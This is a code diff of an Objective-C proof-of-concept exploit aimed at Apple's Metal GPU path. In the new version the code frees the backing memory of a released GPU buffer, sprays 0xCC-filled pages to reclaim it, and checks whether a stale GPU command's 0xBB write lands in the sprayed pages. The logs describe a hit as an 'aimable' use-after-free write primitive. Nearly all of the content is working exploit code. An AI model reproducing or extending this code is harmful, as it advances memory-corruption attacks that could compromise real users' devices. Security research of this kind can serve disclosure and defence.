@@ -30,7 +30,7 @@
 #import <stdlib.h>
 #import <unistd.h>
 
-#define P137_BUILD  @"p137-latch-v1"
+#define P137_BUILD  @"p137-latch-v2-backingfree"
 #define P137_PAGE   0x4000
 #define P137_SPRAY  48
 
@@ -107,9 +107,16 @@ static void p137_bandit(const char *outcome) {
     [e endEncoding];
     L(@"[2] held command encoded (fill 0xBB) - NOT committed yet.");
 
-    /* ---- 3: drop the buffer (the mapping undo); pages stay live ---- */
+    /* ---- 3: drop the buffer AND the backing (the true stale state) --
+       v1 proved the kernel ACCEPTS a command over the deleted record
+       and the GPU executed through the binding (0xBB landed in our
+       live old pages). v2 makes the target die: the backing itself is
+       vm_deallocated - so the stale GVA points at FREED memory, and
+       the 0xCC spray then decides who reclaims it.                    */
     buf = nil;
-    L(@"[3] MTLBuffer released = the commitUnmaps path (pages kept).");
+    kern_return_t frkr = vm_deallocate(mach_task_self(), pages, P137_PAGE);
+    Lf(@"[3v2] MTLBuffer released + the BACKING vm_deallocated (kr=0x%x) ="
+       @" the stale GVA now dangles over freed pages.", (unsigned)frkr);
 
     /* ---- 4: the spray ---- */
     void *spray[P137_SPRAY]; uint32_t ns = 0;
@@ -129,11 +136,12 @@ static void p137_bandit(const char *outcome) {
     [NSThread sleepForTimeInterval:0.3];
     Lf(@"[5] held command committed; cb.status=%ld (0=pending,1=committed)", (long)held.status);
 
-    /* ---- 6: the verdict scans ---- */
-    L(@"=== VERDICT: where did the 0xBB land? ===");
+    /* ---- 6: the verdict scans (the backing was freed in v2; the old-
+       page scan is SKIPPED by law - touching freed pages would fault
+       our own process. The spray is the only target.                  */
+    L(@"=== VERDICT: where did the 0xBB land? (v2: the backing is dead -");
+    L(@"    only the spray can answer) ===");
     uint32_t hitOld = 0, hitSpray = 0;
-    for (uint32_t j = 0; j < P137_PAGE; j++)
-        if (((uint8_t *)pages)[j] == 0xBB) { hitOld++; break; }
     for (uint32_t i = 0; i < ns; i++) {
         for (uint32_t j = 0; j < P137_PAGE; j++)
             if (((uint8_t *)spray[i])[j] == 0xBB) {
@@ -141,7 +149,7 @@ static void p137_bandit(const char *outcome) {
                 hitSpray++; break;
             }
     }
-    if (hitOld) L(@"   STALE-WRITE INTO OUR OLD PAGES = the record survived");
+    /* (the v1 hitOld branch is retired in v2 - backing freed) */
     L(@"   the unmap: the GPU executed through the stale GVA binding.");
     if (hitSpray) Lf(@"   RECLAIM-HIT in %u SPRAY PAGES = 0xBB over 0xCC = the"
                      @" stale record rode the reclaimed backing = THE AIMABLE-"
@@ -175,7 +183,6 @@ static void p137_bandit(const char *outcome) {
     for (uint32_t i = 0; i < ns; i++) vm_deallocate(mach_task_self(),
                                                     (vm_address_t)spray[i],
                                                     P137_PAGE);
-    vm_deallocate(mach_task_self(), pages, P137_PAGE);
     Lf(@"=== p137 end %@ ===", LabLocalMilitaryNow());
     return P137R();
 }
